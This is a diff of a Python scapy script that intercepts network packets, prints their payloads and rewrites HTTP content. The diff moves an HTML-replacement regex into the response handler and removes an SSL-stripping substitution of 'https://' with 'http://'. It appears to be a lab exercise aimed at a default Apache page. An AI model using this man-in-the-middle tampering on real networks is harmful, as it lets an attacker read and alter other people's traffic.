@@ -85,10 +85,13 @@ def intercept_packet(packet):
 
 # modified to call intercept_packet
 def process_packet(packet):
-    print("[+] Packet intercepted...")
+    print("[+] Packet intercepted: ")
+    print(packet.get_payload())
+    print("--------------------------------------------------")
 
     # Convert packet to scapy packet
     scapy_packet = IP(packet.get_payload())
+    
 
     # Check if packet is a HTTP request
     if scapy_packet.haslayer(Raw) and scapy_packet.haslayer(TCP):
@@ -96,19 +99,20 @@ def process_packet(packet):
             print("[+] TCP ...")
             load = scapy_packet[Raw].load.decode()
 
+            print("Before modification: \n")
+            print(load)
+
             # Check if the request is trying to establish a secure connection
             if 'https://' in load:
                 # If it is, call the intercept_packet function to handle it
                 print("[+] HTTPS ...")
                 intercept_packet(scapy_packet)
-            else:
-                # Otherwise, modify the request as necessary
+
+            elif 'http://' in load:
                 print("[+] HTTP ...")
 
-                load = re.sub('<html><body><h1>It works!</h1></body></html>', \
-                          '<html><body><h1>Now you are seeing a modified packet</h1></body></html>', load)
-                
-                
+                # Don't do anything if the request is already HTTP
+
                 scapy_packet[Raw].load = load.encode()
                 del scapy_packet[IP].len
                 del scapy_packet[IP].chksum
@@ -122,7 +126,9 @@ def process_packet(packet):
             load = scapy_packet[Raw].load.decode()
 
             # Modify the response as necessary
-            load = re.sub('https://', 'http://', load)
+            load = re.sub('<html><body><h1>It works!</h1></body></html>', \
+                          '<html><body><h1>Now you are seeing a modified packet</h1></body></html>', load)
+                
             scapy_packet[Raw].load = load.encode()
             del scapy_packet[IP].len
             del scapy_packet[IP].chksum
